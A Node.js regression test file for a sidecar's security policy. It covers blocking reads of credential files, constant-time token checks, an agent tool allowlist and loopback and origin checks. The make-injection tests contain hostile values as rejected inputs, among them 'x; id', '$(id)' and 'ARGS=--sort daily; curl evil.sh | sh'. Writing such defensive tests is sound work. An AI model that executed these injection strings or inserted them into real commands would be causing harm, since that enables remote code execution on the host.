'use strict'
// Regression tests for the sidecar access policy. Pure Node, no services.
const assert = require('assert')
const path = require('path')
const fs = require('fs')
const os = require('os')
const S = require('./security')
const {
  isSensitivePath, tokenMatches, MAX_PREVIEW_BYTES,
  isSafeMakeVarValue, unsafeMakeArgs, readEnvToken,
  isLoopbackHost, isAllowedOrigin, checkControlAuth,
} = S

let passed = 0
let failed = 0
const pending = []
function test(name, fn) {
  try {
    const r = fn()
    if (r && typeof r.then === 'function') {
      pending.push(r.then(
        () => { passed++; console.log(`  ok  ${name}`) },
        (err) => { failed++; console.error(`  FAIL  ${name}: ${err.message}`) },
      ))
      return
    }
    passed++
    console.log(`  ok  ${name}`)
  } catch (err) {
    failed++
    console.error(`  FAIL  ${name}: ${err.message}`)
  }
}

test('rejects .env and its real-value variants', () => {
  for (const p of ['/work/harness/resolve-lume/.env', '/work/.env.local', '/work/.env.production', '/work/.env.bak']) {
    assert.strictEqual(isSensitivePath(p), true, `${p} must be blocked`)
  }
})

test('still allows public env templates', () => {
  for (const p of ['/work/harness/resolve-lume/.env.example', '/work/.env.sample', '/work/.env.template']) {
    assert.strictEqual(isSensitivePath(p), false, `${p} must stay readable`)
  }
})

test('rejects keys, credentials and sensitive directories', () => {
  for (const p of [
    '/home/me/.ssh/id_rsa', '/work/id_ed25519', '/work/server.key',
    '/work/cert.pem', '/work/credentials.json', '/home/me/.aws/config',
    '/work/api_key.txt', '/home/me/.netrc',
  ]) {
    assert.strictEqual(isSensitivePath(p), true, `${p} must be blocked`)
  }
})

test('does not over-block ordinary source files', () => {
  for (const p of ['/work/src/tokenizer.c', '/work/README.md', '/work/src/app.js', '/work/notes/password-policy.md']) {
    assert.strictEqual(isSensitivePath(p), false, `${p} should be readable`)
  }
})

test('accepts relative paths and normalises them', () => {
  assert.strictEqual(isSensitivePath(path.join(process.cwd(), '../.env')), true)
})

test('token comparison is exact, constant-time and fails closed', () => {
  const secret = 'a'.repeat(64)
  assert.strictEqual(tokenMatches(secret, secret), true)
  assert.strictEqual(tokenMatches('b'.repeat(64), secret), false)
  assert.strictEqual(tokenMatches('a', secret), false)
  assert.strictEqual(tokenMatches(undefined, secret), false)
  assert.strictEqual(tokenMatches(['a'.repeat(64)], secret), false, 'duplicate headers must not match')
  assert.strictEqual(tokenMatches(secret, ''), false, 'empty expected token must never authenticate')
  assert.strictEqual(tokenMatches('', ''), false)
})

test('preview cap is bounded', () => {
  assert.ok(MAX_PREVIEW_BYTES > 0 && MAX_PREVIEW_BYTES <= 8 * 1024 * 1024)
})

// The allowlist is the server-side enforcement for /api/tools/call. If the
// generated bridge is missing, every agent tool would be denied: catch that
// here instead of discovering it from a silent 403 in production.
test('agent tool allowlist is generated and excludes high-risk tools', () => {
  const B = require('./builtin-exec')
  assert.ok(B.AGENT_TOOL_ALLOW.size >= 20, 'run `make tools-lume` to regenerate the bridge')
  for (const n of ['article-write', 'capabilities', 'read-file']) {
    assert.ok(B.AGENT_TOOL_ALLOW.has(n), `${n} should be exposed to the agent`)
  }
  for (const n of ['shell', 'write-file', 'article-publish', 'hot-news-publish']) {
    if (B.BUILTIN_NAMES.has(n)) {
      assert.ok(!B.AGENT_TOOL_ALLOW.has(n), `${n} must NOT be reachable from /api/tools/call`)
    }
  }
})

// ---- make variable injection (dev-stats ARGS / article P= ...) ----------
test('make values accept ordinary CLI arguments, slugs and paths', () => {
  for (const v of [
    '', '--sort daily --limit 10', 'lume-a2a', 'report', '2026-11-04',
    '--yes', '--user some-name', '--exclude a,b', './output/stats.csv',
    'csv-traffic --no-traffic', '中文标题 v1.2',
  ]) assert.strictEqual(isSafeMakeVarValue(v), true, `should allow: ${v}`)
})

test('make values reject every shell metacharacter class', () => {
  for (const v of [
    'x; id', 'x && id', 'x || id', '$(id)', '`id`', '${HOME}', 'x | sh',
    'x > /tmp/pwn', 'x < /etc/passwd', "'x'", '"x"', 'x\\y', 'x\ny',
    'x\ry', 'x\tb', 'x#b', 'x!b', 'x*b', 'x?b', 'x[b]', 'x{b}', 'x(b)',
    'x\u0000y', 'x & id',
  ]) assert.strictEqual(isSafeMakeVarValue(v), false, `must reject: ${JSON.stringify(v)}`)
  assert.strictEqual(isSafeMakeVarValue('x'.repeat(2049)), false, 'long values are capped')
  assert.strictEqual(isSafeMakeVarValue(undefined), false)
})

test('unsafeMakeArgs flags KEY=value but leaves bare make targets alone', () => {
  assert.deepStrictEqual(unsafeMakeArgs(['report', 'ARGS=--sort daily', 'FLAGS=--yes']), [])
  const bad = unsafeMakeArgs(['run', 'ARGS=--sort daily; curl evil.sh | sh', 'P=lume-a2a'])
  assert.strictEqual(bad.length, 1)
  assert.ok(/ARGS/.test(bad[0]))
  assert.ok(!/curl evil/.test(bad[0]), 'never echo the injected payload into logs')
  assert.ok(unsafeMakeArgs(['report', '9BAD=x']).length === 1, 'invalid variable name')
})

test('runMakeIn refuses injection before spawning any child process', async () => {
  const H = require('./business-helpers')
  const r = await H.runMakeIn('/definitely/not/a/real/dir', ['report', 'ARGS=x; id'], {})
  assert.strictEqual(r.ok, false)
  assert.ok(/unsafe make arguments rejected/.test(r.error), r.error)
  assert.ok(!/exited with code|spawn failed/.test(r.error), 'must not have spawned make')
})

// ---- loopback control plane (:3099) -------------------------------------
test('readEnvToken reads only SIDECAR_TOKEN and tolerates quoting', () => {
  const f = path.join(os.tmpdir(), `rl-security-test-${process.pid}.env`)
  try {
    fs.writeFileSync(f, 'OTHER_KEY=hello\nSIDECAR_TOKEN="unit-test-token"\nANOTHER=world\n')
    assert.strictEqual(readEnvToken(f), 'unit-test-token')
    fs.writeFileSync(f, 'OTHER_KEY=hello\n')
    assert.strictEqual(readEnvToken(f), '')
    assert.strictEqual(readEnvToken(f + '.missing'), '')
  } finally {
    try { fs.unlinkSync(f) } catch {}
  }
})

test('control plane rejects non-loopback hosts and cross-site origins', () => {
  for (const h of ['127.0.0.1:3099', 'localhost:3099', '127.0.0.1:18085', '[::1]:3099']) {
    assert.strictEqual(isLoopbackHost(h), true, h)
  }
  for (const h of ['evil.example.com:3099', '0.0.0.0:3099', '', undefined]) {
    assert.strictEqual(isLoopbackHost(h), false, String(h))
  }
  assert.strictEqual(isAllowedOrigin(undefined, '127.0.0.1:3099'), true, 'curl/make send no Origin')
  assert.strictEqual(isAllowedOrigin('http://127.0.0.1:18085', '127.0.0.1:18085'), true)
  assert.strictEqual(isAllowedOrigin('http://evil.example.com', '127.0.0.1:3099'), false)
  assert.strictEqual(isAllowedOrigin('not-a-url', '127.0.0.1:3099'), false)
})

test('control auth is fail-closed on wrong token, bad Host and bad Origin', () => {
  const base = { expected: 's'.repeat(64), host: '127.0.0.1:3099' }
  assert.deepStrictEqual(checkControlAuth({ ...base, provided: base.expected }), { ok: true })
  assert.strictEqual(checkControlAuth({ ...base, provided: 'wrong' }).code, 401)
  assert.strictEqual(checkControlAuth(base).code, 401, 'missing token is 401')
  assert.strictEqual(checkControlAuth({ ...base, provided: base.expected, host: 'evil.example.com' }).code, 403)
  assert.strictEqual(checkControlAuth({ ...base, provided: base.expected, origin: 'http://evil.example.com' }).code, 403)
  assert.strictEqual(checkControlAuth({ ...base, provided: base.expected, expected: '' }).code, 401,
    'empty expected token must never authenticate')
})

Promise.all(pending).then(() => {
  console.log(`\nsecurity: ${passed}/${passed + failed} passed`)
  if (failed) process.exit(1)
})
